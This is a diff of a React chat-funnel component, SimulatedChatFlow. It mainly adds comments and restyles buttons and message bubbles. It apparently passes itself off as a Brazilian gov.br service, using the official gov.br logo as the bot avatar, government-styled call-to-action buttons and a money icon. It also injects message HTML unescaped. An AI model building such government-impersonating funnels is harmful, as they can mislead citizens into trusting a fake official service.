-    if (iconName.includes('currency_dollar')) return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0}}>💰</span>;
+    if (iconName.includes('currency_dollar')) return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0}}>💰</span>; // Emoji as placeholder
     return null;
   }
 
@@ -738,7 +789,8 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
       <audio ref={audioRef} style={{ display: 'none' }} />
 
-      {videoStepData && (
+      {/* Video Placeholder Section */}
+      {videoStepData && ( // Only render if videoStepData is set (i.e., current step is videoDisplay)
         <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
           {currentVideoMessage && <p className="bot-message" style={{ background: '#f1f1f1', boxShadow: 'none', paddingLeft: 0, marginBottom: '10px', whiteSpace: 'pre-line' }}>{currentVideoMessage}</p>}
           <div
@@ -750,7 +802,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               backgroundColor: '#333', cursor: 'pointer'
             }}
           >
-            {showVideoThumbnailOverlay && (
+            {showVideoThumbnailOverlay && ( // Show overlay if state is true
               <div
                 style={{
                   position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
@@ -765,6 +817,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               </div>
             )}
              <div style={{display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100%', color: '#777'}}>
+                {/* Placeholder text for when video would be playing */}
                 { !showVideoThumbnailOverlay && <span style={{color: 'white'}}>Vídeo Iniciado (Simulado)</span> }
              </div>
           </div>
@@ -772,24 +825,27 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       )}
 
 
-      {isLoadingStep && loadingMessage && (
+      {/* Loading Screen Section */}
+      {isLoadingStep && loadingMessage && ( // Only render if isLoadingStep is true
         <div className="loading-step-container" style={{ textAlign: 'center', padding: '20px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
           <Loader2 className="animate-spin" size={32} style={{ margin: '0 auto 10px auto', color: '#1451b4' }} />
           <p style={{ fontSize: '16px', color: '#333', whiteSpace: 'pre-line' }}>{loadingMessage}</p>
         </div>
       )}
 
-      {currentImageDetails && !isLoadingStep && (
+      {/* Display Image Section */}
+      {currentImageDetails && !isLoadingStep && ( // Only render if currentImageDetails is set and not loading
         <div className="image-step-container" style={{ padding: '15px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
           {currentImageDetails.message && <p className="bot-message" style={{ background: '#f1f1f1', boxShadow: 'none', paddingLeft:0, marginBottom: '10px', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentImageDetails.message}}/>}
           <Image src={currentImageDetails.url} alt={currentImageDetails.alt} width={300} height={400} style={{ display:'block', maxWidth: '100%', height: 'auto', borderRadius: '4px', border: '1px solid #eee', margin: '0 auto' }} data-ai-hint={currentImageDetails.aiHint || "document image"}/>
         </div>
       )}
       
-      {currentDisplayMessage && !isLoadingStep && (
+      {/* Display Formatted Message Section */}
+      {currentDisplayMessage && !isLoadingStep && ( // Only render if currentDisplayMessage is set and not loading
         <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%', width: '100%'}}>
            <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
-           <div className="message bot-message" style={{width: 'calc(100% - 40px)'}}>
+           <div className="message bot-message" style={{width: 'calc(100% - 40px)'}}> {/* Ensure message bubble takes available width */}
               {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                 {getIconComponent(currentDisplayMessage.displayIcon)}
                 <span dangerouslySetInnerHTML={{ __html: currentDisplayMessage.displayTitle }} />
@@ -805,29 +861,33 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                   ))}
                 </div>
               )}
-               { (currentDisplayMessage.displayIcon && (funnelDefinition[currentStepKey]?.data as FlowStepDataDisplayMessage)?.note) && (
+               {/* Display note if available in the original step data for displayMessage */}
+               { (currentDisplayMessage.displayIcon && (funnelDefinition.steps[currentStepKey]?.data as FlowStepDataDisplayMessage)?.note) && (
                 <p style={{fontSize: '12px', color: '#666', marginTop: '10px', borderTop: '1px dashed #ddd', paddingTop: '8px'}}>
-                    <strong>Nota:</strong> {(funnelDefinition[currentStepKey]?.data as FlowStepDataDisplayMessage)?.note}
+                    <strong>Nota:</strong> {formatText((funnelDefinition.steps[currentStepKey]?.data as FlowStepDataDisplayMessage)?.note)}
                 </p>
               )}
            </div>
         </div>
       )}
 
+      {/* Regular Chat Messages */}
       {messages.map((msg) => (
           <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
             {msg.sender === 'bot' && (
+              // Ensure Image component has width and height for bot avatar
               <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
             )}
             <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
               {msg.text && <span style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />}
+              {/* Render options if they exist, bot is not typing, and text input is not active */}
               {msg.sender === 'bot' && msg.options && !isBotTyping && !isTextInputActive && (
                 <div className="options-container">
                   {msg.options.map(opt => (
                     <button
-                      key={opt.text} 
+                      key={opt.text} // Using text as key, consider more unique IDs if text can repeat
                       onClick={() => handleOptionClick(opt)}
-                      className={`chat-option-button ${opt.style || ''}`}
+                      className={`chat-option-button ${opt.style || ''}`} // Apply dynamic styles
                        dangerouslySetInnerHTML={{__html: opt.text}}
                     />
                   ))}
@@ -838,6 +898,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         )
       )}
 
+      {/* Text Input Form */}
       {isTextInputActive && currentTextInputConfig && !isBotTyping && (
         <form onSubmit={handleTextInputFormSubmit} className="chat-input-form-container" style={{ display: 'flex', marginTop: '10px', padding: '5px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
           <input
@@ -855,7 +916,8 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         </form>
       )}
 
-      {isBotTyping && !isLoadingStep && !videoStepData && !currentDisplayMessage && !currentImageDetails && !isTextInputActive && (
+      {/* Bot Typing Indicator */}
+      {isBotTyping && !isLoadingStep && !videoStepData && !currentDisplayMessage && !currentImageDetails && !isTextInputActive && ( // Show only if no other special UI is active
          <div className="message-container bot-message-container">
             <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
             <div className="message bot-message typing-indicator">
@@ -870,50 +932,51 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         .user-message-container { align-self: flex-end; flex-direction: row-reverse; }
         .bot-avatar { width: 32px; height: 32px; border-radius: 50%; margin-right: 8px; margin-top: 4px; align-self: flex-start; object-fit: cover; }
         .message { padding: 10px 15px; border-radius: 18px; line-height: 1.4; font-size: 15px; word-wrap: break-word; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
-        .bot-message { background-color: #f1f1f1; color: #333; border-radius: 12px; }
-        .user-message { background-color: #1451b4; color: white; border-radius: 12px; margin-right: 0; }
+        .bot-message { background-color: #e9ecef; /* Light grey for bot messages */ color: #333; border-radius: 12px; }
+        .user-message { background-color: #1451b4; /* Blue for user messages */ color: white; border-radius: 12px; margin-right: 0; }
         .user-message-container .user-message { margin-left: auto; }
         
         .options-container { 
           margin-top: 10px; 
           display: flex; 
-          flex-direction: row; /* Horizontal layout */
-          flex-wrap: wrap; /* Allow buttons to wrap */
-          justify-content: flex-start; /* Align buttons to the start (left) */
+          flex-direction: column; /* Stack options vertically */
+          align-items: flex-start; /* Align options to the left */
           gap: 8px; 
-          width: 100%; /* Options container takes full width relative to message bubble */
-          padding-left: 40px; /* Align with bot text if avatar is present, or adjust as needed */
+          /* width: 100%; Options container takes full width relative to message bubble */
+          /* padding-left: 40px; Removed padding-left for closer alignment under message */
         }
         .chat-option-button {
-          background-color: #0d6efd; /* Strong blue */
+          background-color: #007bff; /* Brighter blue for user options */
           color: white;
           border: none;
-          padding: 8px 18px; 
-          border-radius: 20px; /* Pill shape */
+          padding: 10px 20px; 
+          border-radius: 25px; /* Pill shape */
           cursor: pointer; 
-          font-size: 14px;
+          font-size: 15px;
           font-weight: 500;
           transition: background-color 0.2s;
           text-align: center;
-          box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-          /* Removed width: auto; display: inline-block - flex properties on container will handle sizing */
+          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+          /* width: auto; display: inline-block - flex properties on container will handle sizing */
         }
-        .chat-option-button:hover { background-color: #0b5ed7; /* Darker blue on hover */ }
+        .chat-option-button:hover { background-color: #0056b3; /* Darker blue on hover */ }
 
-        .chat-option-button.primary_cta_button_gov_style { background-color: #16a34a; border-color: #16a34a; color: white; font-weight: bold;}
+        /* Specific styles for CTA buttons from funnelDefinition */
+        .chat-option-button.primary_cta_button_gov_style { background-color: #16a34a; /* Green */ border-color: #16a34a; color: white; font-weight: bold;}
         .chat-option-button.primary_cta_button_gov_style:hover { background-color: #15803d; border-color: #15803d; color: white; }
         
-        .chat-option-button.secondary_link_button_gov_style { background-color: transparent; border: none; color: #1451b4; text-decoration: underline; padding: 4px 0; box-shadow: none;}
-        .chat-option-button.secondary_link_button_gov_style:hover { color: #0b2e63; background-color: transparent; }
+        .chat-option-button.secondary_link_button_gov_style { background-color: transparent; border: none; color: #007bff; /* Blue link */ text-decoration: underline; padding: 4px 0; box-shadow: none; font-size: 14px;}
+        .chat-option-button.secondary_link_button_gov_style:hover { color: #0056b3; background-color: transparent; }
 
-        .chat-option-button.destructive_link_button_gov_style { background-color: transparent; border: none; color: #dc2626; text-decoration: underline; padding: 4px 0; box-shadow: none;}
-        .chat-option-button.destructive_link_button_gov_style:hover { color: #b91c1c; background-color: transparent; }
+        .chat-option-button.destructive_link_button_gov_style { background-color: transparent; border: none; color: #dc3545; /* Red link */ text-decoration: underline; padding: 4px 0; box-shadow: none; font-size: 14px;}
+        .chat-option-button.destructive_link_button_gov_style:hover { color: #c82333; background-color: transparent; }
         
         .typing-indicator { display: inline-flex; align-items: center; padding: 10px 15px; }
         .typing-indicator .dot { width: 8px; height: 8px; margin: 0 2px; background-color: #aaa; border-radius: 50%; animation: bounce 1.4s infinite; }
         .typing-indicator .dot:nth-child(2) { animation-delay: 0.2s; }
         .typing-indicator .dot:nth-child(3) { animation-delay: 0.4s; }
         @keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
+        /* Ensure displayMessage block takes full width for its content */
         .display-message-block .bot-message { width: auto; max-width: 100%; }
       `}</style>
     </div>
@@ -921,3 +984,5 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 };
 
 export default SimulatedChatFlow;
+
+    
